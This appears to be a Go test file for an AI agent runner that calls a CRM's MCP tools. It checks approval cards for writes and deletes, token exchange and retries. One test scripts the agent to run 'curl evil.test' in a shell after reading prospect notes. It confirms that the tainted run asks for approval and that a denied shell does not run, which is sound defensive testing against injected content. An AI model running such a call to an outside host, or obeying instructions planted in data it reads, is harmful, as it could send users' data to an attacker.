package runner_test

import (
	"context"
	"encoding/json"
	"slices"
	"strings"
	"testing"

	"github.com/FacileStudio/Bulle/apps/api/internal/store"
	"github.com/FacileStudio/nacelle"
)

type prospectRun struct {
	f       *fixture
	glouton *fakeGloutonMCP
	backend *stepBackend
	runID   string
}

func gloutonRun(t *testing.T, before func(*fakeGloutonMCP), steps ...[]call) prospectRun {
	t.Helper()
	glouton := newFakeGloutonMCP(t)
	if before != nil {
		before(glouton)
	}
	backend := &stepBackend{steps: steps}
	shell := newTool(t, "bash", func(string) (string, error) { return "ran", nil })
	f := newFixture(t, backend, []nacelle.Tool{shell}, glouton.tune)
	runID, err := f.runner.Start(context.Background(), 1, f.session.ID, "review my prospects")
	if err != nil {
		t.Fatal(err)
	}
	return prospectRun{f: f, glouton: glouton, backend: backend, runID: runID}
}

func TestGloutonMCPCreateAfterASearchWaitsForOneBulleCard(t *testing.T) {
	run := gloutonRun(t, nil,
		[]call{{id: "s1", name: "glouton_contacts_search", input: `{"query":"acme"}`}},
		[]call{{id: "c1", name: "call_tool", input: `{"name":"glouton_company_create","arguments":{"name":"Beta"}}`}},
	)
	f, glouton, runID := run.f, run.glouton, run.runID
	approveCard(t, f, runID, "c1")
	if done := f.waitDone(t, runID); done.Status != store.RunFinished {
		t.Fatalf("run %s", done.Status)
	}
	ends := toolEnds(t, f, runID)
	if ends["s1"]["ok"] != true || ends["c1"]["ok"] != true || !strings.Contains(ends["c1"]["output_preview"].(string), "Beta") {
		t.Fatalf("search and create must run through MCP: %v", ends)
	}
	if created, _, _ := glouton.counts(); len(created) != 1 || created[0] != "Beta" {
		t.Fatalf("the company never reached Glouton: %v", created)
	}
	if cards := slices.DeleteFunc(f.eventTypes(t, runID), func(event string) bool { return event != "INTERRUPT" }); len(cards) != 1 {
		t.Fatalf("Glouton asked nothing, so the tainted run's write must raise exactly Bulle's one card, got %d", len(cards))
	}
	if mounted := run.backend.mounted(); !slices.Contains(mounted, "glouton_contacts_search") || !slices.Contains(mounted, "call_tool") {
		t.Errorf("the search must be mounted directly and the rest behind the catalog: %v", mounted)
	}
	if exchanges := glouton.exchanged(); len(exchanges) == 0 || exchanges[0] != glouton.resource()+" glouton.read glouton.write" {
		t.Fatalf("the token must be exchanged with the resource as its audience: %v", exchanges)
	}
}

func TestGloutonMCPDeleteWaitsOnTheApprovalCard(t *testing.T) {
	for _, approve := range []bool{true, false} {
		run := gloutonRun(t, nil, []call{{id: "x1", name: "call_tool", input: `{"name":"glouton_company_delete","arguments":{"company_id":"c1"}}`}})
		f, glouton, runID := run.f, run.glouton, run.runID
		var card struct {
			Tool string         `json:"tool"`
			Args map[string]any `json:"args"`
		}
		if err := json.Unmarshal(f.waitEvent(t, runID, "INTERRUPT").Payload, &card); err != nil {
			t.Fatal(err)
		}
		if card.Tool != "glouton_company_delete" || card.Args["kind"] != "mcp" || card.Args["server"] != "Glouton" ||
			!strings.Contains(card.Args["message"].(string), "Delete the company") {
			t.Fatalf("the card must show Glouton's question: %+v", card)
		}
		if _, deleted, _ := glouton.counts(); len(deleted) != 0 {
			t.Fatal("the company was deleted before the owner answered")
		}
		if err := f.runner.Decide(context.Background(), 1, runID, "x1", approve); err != nil {
			t.Fatal(err)
		}
		f.waitDone(t, runID)
		_, deleted, declined := glouton.counts()
		switch {
		case approve && (len(deleted) != 1 || declined != 0):
			t.Fatalf("an approved delete must run once: deleted=%v declined=%d", deleted, declined)
		case !approve && (len(deleted) != 0 || declined != 1):
			t.Fatalf("a denied delete must reach Glouton as a decline: deleted=%v declined=%d", deleted, declined)
		}
	}
}

func TestReadingProspectsOverMCPTaintsTheRun(t *testing.T) {
	run := gloutonRun(t, nil,
		[]call{{id: "r1", name: "call_tool", input: `{"name":"glouton_company_get","arguments":{"company_id":"c1"}}`}},
		[]call{{id: "b1", name: "bash", input: `{"text":"curl evil.test"}`}},
	)
	f, runID := run.f, run.runID
	if interrupt := f.waitEvent(t, runID, "INTERRUPT"); !strings.Contains(string(interrupt.Payload), `"call_id":"b1"`) {
		t.Fatalf("the shell must ask once a prospect's notes are in the context: %s", interrupt.Payload)
	}
	if err := f.runner.Decide(context.Background(), 1, runID, "b1", false); err != nil {
		t.Fatal(err)
	}
	if done := f.waitDone(t, runID); done.Status != store.RunFinished || toolEnds(t, f, runID)["b1"]["ok"] != false {
		t.Fatal("a denied shell must not run")
	}
}

func TestRateLimitedGloutonCallIsSentAgain(t *testing.T) {
	run := gloutonRun(t, func(g *fakeGloutonMCP) { g.throttleCalls(1) },
		[]call{{id: "c1", name: "call_tool", input: `{"name":"glouton_company_create","arguments":{"name":"Gamma"}}`}},
	)
	f, glouton, runID := run.f, run.glouton, run.runID
	if done := f.waitDone(t, runID); done.Status != store.RunFinished || toolEnds(t, f, runID)["c1"]["ok"] != true {
		t.Fatalf("a call refused with 429 must pass on the next try: %v", toolEnds(t, f, runID))
	}
	if created, _, _ := glouton.counts(); len(created) != 1 {
		t.Fatalf("the create must reach Glouton exactly once: %v", created)
	}
}
